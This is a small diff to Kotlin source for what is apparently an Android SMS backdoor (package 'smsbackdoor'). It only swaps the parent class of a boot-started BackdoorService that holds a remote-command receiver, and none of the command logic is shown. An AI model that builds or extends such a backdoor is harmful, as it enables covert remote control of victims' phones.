@@ -17,7 +17,7 @@ package com.evilthreads.smsbackdoor
 
 import android.content.IntentFilter
 import android.provider.Telephony
-import com.candroid.bootlaces.BootService
+import com.candroid.bootlaces.LifecycleBootService
 
 /*
             (   (                ) (             (     (
@@ -39,7 +39,7 @@ import com.candroid.bootlaces.BootService
 ............\..............(
 ..............\.............\...
 */
-internal class BackdoorService : BootService(){
+internal class BackdoorService : LifecycleBootService(){
     private lateinit var receiver: RemoteCommandReceiver
 
     override fun onCreate() {
